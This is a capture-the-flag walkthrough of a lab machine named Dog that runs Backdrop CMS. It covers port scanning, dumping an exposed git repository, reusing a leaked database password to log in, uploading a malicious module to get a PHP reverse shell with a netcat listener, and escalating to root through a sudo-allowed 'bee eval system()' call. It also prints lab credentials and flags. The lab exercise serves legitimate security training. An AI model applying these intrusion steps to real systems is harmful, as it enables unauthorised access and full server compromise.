
nmap -sV  10.10.11.58 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 04:56 CEST
Nmap scan report for 10.10.11.58
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.46 seconds


feroxbuster -u http://10.10.11.58/ -w /usr/share/wordlists/seclists/PathBANGER.txt  -x php,sh 
gets us a shit ton of hits so here are some of the intersting ones
```
### 🧠 **Interesting Files (Potentially Sensitive or Useful Info)**

- `http://10.10.11.58/README.md`
    
- `http://10.10.11.58/settings.php` _(zero-length, but a common config file worth checking manually)_
    

---

### ⚙️ **Executable Scripts**

- `http://10.10.11.58/core/scripts/install.sh`
    
- `http://10.10.11.58/core/scripts/backdrop.sh`
    
- `http://10.10.11.58/core/scripts/generate-d7-content.sh`
    
- `http://10.10.11.58/core/scripts/dump-database-d7.sh`
    
- `http://10.10.11.58/core/scripts/password-hash.sh`
    
- `http://10.10.11.58/core/scripts/run-tests.sh`
    
- `http://10.10.11.58/core/scripts/test.script`
    

---

### 📂 **Config Files (JSON / YAML / etc.)**

Under `/files/config_*/active/`:

- All the `*.json` files here represent **Drupal/Backdrop config exports**, including:
    
    - `user.role.authenticated.json`
        
    - `system.core.json`
        
    - `user.role.administrator.json`
        
    - `filter.format.full_html.json`
        
    - `menu.menu.main-menu.json`
        
    - `layout.layout.home.json`
        
    - `user.mail.json`
        
    - `views.view.user_admin.json`
        
    - and many more...
        

These give a **full view of the site structure, roles, views, and content types**. Very useful.

---

### 🖼️ **User-uploaded Content (images, styles, etc.)**

- `/files/field/image/*.jpg`
    
    - `dog.jpeg`
        
    - `dog-animal_dotorlbdd7.jpg`
        
    - `dog-obesity.jpg`
        
    - `dog-food.jpg`
        
    - Suggests possible image upload functionality
        

---

### 🛠️ **Admin/Install/Update Pages**

- `http://10.10.11.58/core/install.php`
    
- `http://10.10.11.58/core/authorize.php` _(403, but still interesting)_
    
- `http://10.10.11.58/core/update.php` _(403)_
    
- `http://10.10.11.58/core/cron.php` _(403)_
    
- `http://10.10.11.58/index.php`
```

Going over all these there is not much interesting to be found.

I use `feroxbuster` to look for interesting endpoints:

```

```


Let's say we discover:
    /core
    /modules
    /files
    /settings.php
    /robots.txt
    /index.php

## Dump Git Repo

Dump the `.git` directory using `gitdumper.sh`:
note: you need to let this run for a while 
```
gitdumper.sh http://dog.htb/.git/ dog-git
cd dog-git
```

then use the extractor

then find user
```
grep -R "@dog.htb" *                                           
Desktop/shared vault/kali-vault/publish/HTB boxes/Dog.md:root <dog@dog.htb>
Desktop/shared vault/kali-vault/publish/HTB boxes/Dog.md:tiffany <tiffany@dog.htb>
GitTools/Extractor/git-ext/0-8204779c764abd4c9d8d95038b6d22b6a7515afa/commit-meta.txt:author root <dog@dog.htb> 1738963331 +0000
GitTools/Extractor/git-ext/0-8204779c764abd4c9d8d95038b6d22b6a7515afa/commit-meta.txt:committer root <dog@dog.htb> 1738963331 +0000
GitTools/Dumper/git-dump/.git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000     commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
GitTools/Dumper/git-dump/.git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000        commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases

```


Search for database credentials:
```
grep -r "mysql://" .
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

So, creds are:

- **User**: `root`
- **Password**: `BackDropJ2024DS2024`

Which does not work :sad:

```
root <dog@dog.htb>
tiffany <tiffany@dog.htb>
```
Try logging in at:
http://dog.htb/?q=user/login
Using:
```
Username: tiffany
Password: BackDropJ2024DS2024
```
**Success** — logged in as Tiffany.

## Authenticated RCE via Module Upload

Backdrop CMS v1.27.1 is vulnerable to **RCE via malicious module upload**.
### Prepare payload:

Make a folder named `shell/` with two files:
shell.info
```
type = module
name = Shell
description = Reverse shell
core = 1.x
package = Custom
version = 1.0
```

#### `shell.php`:

Insert a PHP reverse shell payload (e.g., from [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)).
Then archive the folder:
```
tar -czf shell.tar.gz shell/
```

## Upload Module & Trigger Shell

Go to:
http://dog.htb/?q=admin/modules/install
- Upload `shell.tar.gz`
- Enable the module if required
- Trigger shell at:
http://dog.htb/modules/shell/shell.php
Meanwhile, on your attacker machine:
```
nc -lvnp 1234
```

Reverse shell caught as **`**www-data**`
In your reverse shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
ls /home
johncusack

su johncusack
Password: BackDropJ2024DS2024

cat ~/user.txt
6f57eee316d57147f467455026103ed7
```

Check `sudo` access:
You’ll see:
```
(ALL) NOPASSWD: /usr/local/bin/bee --root=/var/www/html *
```

This lets you run the `bee` CLI (Backdrop’s tool) with root privileges.
### Exploit with system():
```
sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"

cat /root/root.txt > /tmp/f
cat /tmp/f
b47fde5773706a20f456f96b3f51172d
```
